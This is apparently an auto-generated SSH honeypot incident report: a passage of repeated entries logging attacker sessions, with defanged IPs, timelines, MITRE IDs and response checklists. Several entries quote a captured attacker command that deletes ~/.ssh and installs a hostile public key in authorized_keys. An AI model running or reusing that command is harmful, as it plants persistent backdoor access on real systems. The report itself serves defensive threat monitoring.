| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:35:36` | `cowrie.session.connect` |
| `2026-04-14 02:35:36` | `cowrie.client.version` |
| `2026-04-14 02:35:36` | `cowrie.client.kex` |
| `2026-04-14 02:35:37` | `cowrie.login.success` |
| `2026-04-14 02:35:37` | `cowrie.session.params` |
| `2026-04-14 02:35:37` | `cowrie.command.input` |
| `2026-04-14 02:35:37` | `cowrie.command.failed` |
| `2026-04-14 02:35:37` | `cowrie.log.closed` |
| `2026-04-14 02:35:38` | `cowrie.session.params` |
| `2026-04-14 02:35:38` | `cowrie.command.input` |
| `2026-04-14 02:35:38` | `cowrie.session.file_download` |
| `2026-04-14 02:35:38` | `cowrie.log.closed` |
| `2026-04-14 02:35:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.89.253[.]36` to AbuseIPDB if not already reported
- [ ] Block `152.89.253[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2dbc8b1eae47

| Field | Detail |
|---|---|
| **Source IP** | `152.89.253[.]36` |
| **First Seen** | 2026-04-14 02:35 |
| **Last Seen** | 2026-04-14 02:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:35:40` | `cowrie.session.connect` |
| `2026-04-14 02:35:40` | `cowrie.client.version` |
| `2026-04-14 02:35:40` | `cowrie.client.kex` |
| `2026-04-14 02:35:41` | `cowrie.login.success` |
| `2026-04-14 02:35:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.89.253[.]36` to AbuseIPDB if not already reported
- [ ] Block `152.89.253[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8597c21eeae7

| Field | Detail |
|---|---|
| **Source IP** | `152.89.253[.]36` |
| **First Seen** | 2026-04-14 02:37 |
| **Last Seen** | 2026-04-14 02:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:37:14` | `cowrie.session.connect` |
| `2026-04-14 02:37:14` | `cowrie.client.version` |
| `2026-04-14 02:37:14` | `cowrie.client.kex` |
| `2026-04-14 02:37:15` | `cowrie.login.success` |
| `2026-04-14 02:37:15` | `cowrie.session.params` |
| `2026-04-14 02:37:15` | `cowrie.command.input` |
| `2026-04-14 02:37:15` | `cowrie.command.failed` |
| `2026-04-14 02:37:15` | `cowrie.log.closed` |
| `2026-04-14 02:37:15` | `cowrie.session.params` |
| `2026-04-14 02:37:15` | `cowrie.command.input` |
| `2026-04-14 02:37:16` | `cowrie.session.file_download` |
| `2026-04-14 02:37:16` | `cowrie.log.closed` |
| `2026-04-14 02:37:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.89.253[.]36` to AbuseIPDB if not already reported
- [ ] Block `152.89.253[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-105fd4995e7e

| Field | Detail |
|---|---|
| **Source IP** | `152.89.253[.]36` |
| **First Seen** | 2026-04-14 02:37 |
| **Last Seen** | 2026-04-14 02:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:37:18` | `cowrie.session.connect` |
| `2026-04-14 02:37:18` | `cowrie.client.version` |
| `2026-04-14 02:37:18` | `cowrie.client.kex` |
| `2026-04-14 02:37:18` | `cowrie.login.success` |
| `2026-04-14 02:37:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.89.253[.]36` to AbuseIPDB if not already reported
- [ ] Block `152.89.253[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-351fb24c3465

| Field | Detail |
|---|---|
| **Source IP** | `152.89.253[.]36` |
| **First Seen** | 2026-04-14 02:38 |
| **Last Seen** | 2026-04-14 02:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:38:47` | `cowrie.session.connect` |
| `2026-04-14 02:38:47` | `cowrie.client.version` |
| `2026-04-14 02:38:48` | `cowrie.client.kex` |
| `2026-04-14 02:38:48` | `cowrie.login.success` |
| `2026-04-14 02:38:48` | `cowrie.session.params` |
| `2026-04-14 02:38:48` | `cowrie.command.input` |
| `2026-04-14 02:38:48` | `cowrie.command.failed` |
| `2026-04-14 02:38:49` | `cowrie.log.closed` |
| `2026-04-14 02:38:49` | `cowrie.session.params` |
| `2026-04-14 02:38:49` | `cowrie.command.input` |
| `2026-04-14 02:38:49` | `cowrie.session.file_download` |
| `2026-04-14 02:38:49` | `cowrie.log.closed` |
| `2026-04-14 02:38:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.89.253[.]36` to AbuseIPDB if not already reported
- [ ] Block `152.89.253[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3dbf61fe9f69

| Field | Detail |
|---|---|
| **Source IP** | `152.89.253[.]36` |
| **First Seen** | 2026-04-14 02:38 |
| **Last Seen** | 2026-04-14 02:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:38:51` | `cowrie.session.connect` |
| `2026-04-14 02:38:51` | `cowrie.client.version` |
| `2026-04-14 02:38:51` | `cowrie.client.kex` |
| `2026-04-14 02:38:52` | `cowrie.login.success` |
| `2026-04-14 02:38:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.89.253[.]36` to AbuseIPDB if not already reported
- [ ] Block `152.89.253[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c9a619d99f1

| Field | Detail |
|---|---|
| **Source IP** | `103.161.170[.]12` |
| **First Seen** | 2026-04-14 02:39 |
| **Last Seen** | 2026-04-14 02:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:39:53` | `cowrie.session.connect` |
| `2026-04-14 02:39:53` | `cowrie.client.version` |
| `2026-04-14 02:39:53` | `cowrie.client.kex` |
| `2026-04-14 02:39:54` | `cowrie.login.success` |
| `2026-04-14 02:39:54` | `cowrie.session.params` |
| `2026-04-14 02:39:54` | `cowrie.command.input` |
| `2026-04-14 02:39:54` | `cowrie.command.failed` |
| `2026-04-14 02:39:54` | `cowrie.log.closed` |
| `2026-04-14 02:39:54` | `cowrie.session.params` |
| `2026-04-14 02:39:54` | `cowrie.command.input` |
| `2026-04-14 02:39:54` | `cowrie.session.file_download` |
| `2026-04-14 02:39:54` | `cowrie.log.closed` |
| `2026-04-14 02:39:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.161.170[.]12` to AbuseIPDB if not already reported
- [ ] Block `103.161.170[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5045f9ef1ab5

| Field | Detail |
|---|---|
| **Source IP** | `103.161.170[.]12` |
| **First Seen** | 2026-04-14 02:39 |
| **Last Seen** | 2026-04-14 02:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:39:56` | `cowrie.session.connect` |
| `2026-04-14 02:39:56` | `cowrie.client.version` |
| `2026-04-14 02:39:56` | `cowrie.client.kex` |
| `2026-04-14 02:39:57` | `cowrie.login.success` |
| `2026-04-14 02:39:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.161.170[.]12` to AbuseIPDB if not already reported
- [ ] Block `103.161.170[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdcdaff67916

| Field | Detail |
|---|---|
| **Source IP** | `152.89.253[.]36` |
| **First Seen** | 2026-04-14 02:46 |
| **Last Seen** | 2026-04-14 02:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:46:12` | `cowrie.session.connect` |
| `2026-04-14 02:46:12` | `cowrie.client.version` |
| `2026-04-14 02:46:12` | `cowrie.client.kex` |
| `2026-04-14 02:46:13` | `cowrie.login.success` |
| `2026-04-14 02:46:13` | `cowrie.session.params` |
| `2026-04-14 02:46:13` | `cowrie.command.input` |
| `2026-04-14 02:46:13` | `cowrie.command.failed` |
| `2026-04-14 02:46:13` | `cowrie.log.closed` |
| `2026-04-14 02:46:13` | `cowrie.session.params` |
| `2026-04-14 02:46:13` | `cowrie.command.input` |
| `2026-04-14 02:46:13` | `cowrie.session.file_download` |
| `2026-04-14 02:46:13` | `cowrie.log.closed` |
| `2026-04-14 02:46:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.89.253[.]36` to AbuseIPDB if not already reported
- [ ] Block `152.89.253[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66860f55503f

| Field | Detail |
|---|---|
| **Source IP** | `152.89.253[.]36` |
| **First Seen** | 2026-04-14 02:46 |
| **Last Seen** | 2026-04-14 02:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:46:16` | `cowrie.session.connect` |
| `2026-04-14 02:46:16` | `cowrie.client.version` |
| `2026-04-14 02:46:16` | `cowrie.client.kex` |
| `2026-04-14 02:46:16` | `cowrie.login.success` |
| `2026-04-14 02:46:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.89.253[.]36` to AbuseIPDB if not already reported
- [ ] Block `152.89.253[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-733e9aee0990

| Field | Detail |
|---|---|
| **Source IP** | `152.89.253[.]36` |
| **First Seen** | 2026-04-14 02:52 |
| **Last Seen** | 2026-04-14 02:52 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:52:15` | `cowrie.session.connect` |
| `2026-04-14 02:52:15` | `cowrie.client.version` |
| `2026-04-14 02:52:15` | `cowrie.client.kex` |
| `2026-04-14 02:52:16` | `cowrie.login.success` |
| `2026-04-14 02:52:17` | `cowrie.session.params` |
| `2026-04-14 02:52:17` | `cowrie.command.input` |
| `2026-04-14 02:52:17` | `cowrie.command.failed` |
| `2026-04-14 02:52:17` | `cowrie.log.closed` |
| `2026-04-14 02:52:18` | `cowrie.session.params` |
| `2026-04-14 02:52:18` | `cowrie.command.input` |
| `2026-04-14 02:52:18` | `cowrie.session.file_download` |
| `2026-04-14 02:52:18` | `cowrie.log.closed` |
| `2026-04-14 02:52:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.89.253[.]36` to AbuseIPDB if not already reported
- [ ] Block `152.89.253[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31e77c137ab6

| Field | Detail |
|---|---|
| **Source IP** | `152.89.253[.]36` |
| **First Seen** | 2026-04-14 02:52 |
| **Last Seen** | 2026-04-14 02:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:52:20` | `cowrie.session.connect` |
| `2026-04-14 02:52:20` | `cowrie.client.version` |
| `2026-04-14 02:52:20` | `cowrie.client.kex` |
| `2026-04-14 02:52:21` | `cowrie.login.success` |
| `2026-04-14 02:52:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.89.253[.]36` to AbuseIPDB if not already reported
- [ ] Block `152.89.253[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0359e3b5d1ee

| Field | Detail |
|---|---|
| **Source IP** | `170.79.37[.]82` |
| **First Seen** | 2026-04-14 02:53 |
| **Last Seen** | 2026-04-14 02:53 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:53:18` | `cowrie.session.connect` |
| `2026-04-14 02:53:18` | `cowrie.client.version` |
| `2026-04-14 02:53:18` | `cowrie.client.kex` |
| `2026-04-14 02:53:19` | `cowrie.login.success` |
| `2026-04-14 02:53:20` | `cowrie.session.params` |
| `2026-04-14 02:53:20` | `cowrie.command.input` |
| `2026-04-14 02:53:20` | `cowrie.command.failed` |
| `2026-04-14 02:53:20` | `cowrie.log.closed` |
| `2026-04-14 02:53:21` | `cowrie.session.params` |
| `2026-04-14 02:53:21` | `cowrie.command.input` |
| `2026-04-14 02:53:21` | `cowrie.session.file_download` |
| `2026-04-14 02:53:21` | `cowrie.log.closed` |
| `2026-04-14 02:53:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]82` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1300cd2ecb61

| Field | Detail |
|---|---|
| **Source IP** | `170.79.37[.]82` |
| **First Seen** | 2026-04-14 02:53 |
| **Last Seen** | 2026-04-14 02:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:53:25` | `cowrie.session.connect` |
| `2026-04-14 02:53:25` | `cowrie.client.version` |
| `2026-04-14 02:53:25` | `cowrie.client.kex` |
| `2026-04-14 02:53:26` | `cowrie.login.success` |
| `2026-04-14 02:53:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]82` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64483b0ad6cb

| Field | Detail |
|---|---|
| **Source IP** | `152.89.253[.]36` |
| **First Seen** | 2026-04-14 02:53 |
| **Last Seen** | 2026-04-14 02:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:53:46` | `cowrie.session.connect` |
| `2026-04-14 02:53:46` | `cowrie.client.version` |
| `2026-04-14 02:53:46` | `cowrie.client.kex` |
| `2026-04-14 02:53:46` | `cowrie.login.success` |
| `2026-04-14 02:53:47` | `cowrie.session.params` |
| `2026-04-14 02:53:47` | `cowrie.command.input` |
| `2026-04-14 02:53:47` | `cowrie.command.failed` |
| `2026-04-14 02:53:47` | `cowrie.log.closed` |
| `2026-04-14 02:53:47` | `cowrie.session.params` |
| `2026-04-14 02:53:47` | `cowrie.command.input` |
| `2026-04-14 02:53:47` | `cowrie.session.file_download` |
| `2026-04-14 02:53:47` | `cowrie.log.closed` |
| `2026-04-14 02:53:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.89.253[.]36` to AbuseIPDB if not already reported
- [ ] Block `152.89.253[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3d6b3da54b3

| Field | Detail |
|---|---|
| **Source IP** | `152.89.253[.]36` |
| **First Seen** | 2026-04-14 02:53 |
| **Last Seen** | 2026-04-14 02:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:53:49` | `cowrie.session.connect` |
| `2026-04-14 02:53:49` | `cowrie.client.version` |
| `2026-04-14 02:53:49` | `cowrie.client.kex` |
| `2026-04-14 02:53:50` | `cowrie.login.success` |
| `2026-04-14 02:53:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.89.253[.]36` to AbuseIPDB if not already reported
- [ ] Block `152.89.253[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d21b7ba18548

| Field | Detail |
|---|---|
| **Source IP** | `114.220.238[.]30` |
| **First Seen** | 2026-04-14 02:57 |
| **Last Seen** | 2026-04-14 02:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:57:18` | `cowrie.session.connect` |
| `2026-04-14 02:57:18` | `cowrie.client.version` |
| `2026-04-14 02:57:18` | `cowrie.client.kex` |
| `2026-04-14 02:57:19` | `cowrie.login.success` |
| `2026-04-14 02:57:19` | `cowrie.session.params` |
| `2026-04-14 02:57:19` | `cowrie.command.input` |
| `2026-04-14 02:57:19` | `cowrie.command.failed` |
| `2026-04-14 02:57:19` | `cowrie.log.closed` |
| `2026-04-14 02:57:20` | `cowrie.session.params` |
| `2026-04-14 02:57:20` | `cowrie.command.input` |
| `2026-04-14 02:57:20` | `cowrie.session.file_download` |
| `2026-04-14 02:57:20` | `cowrie.log.closed` |
| `2026-04-14 02:57:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.220.238[.]30` to AbuseIPDB if not already reported
- [ ] Block `114.220.238[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-897da229cc69

| Field | Detail |
|---|---|
| **Source IP** | `114.220.238[.]30` |
| **First Seen** | 2026-04-14 02:57 |
| **Last Seen** | 2026-04-14 02:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:57:26` | `cowrie.session.connect` |
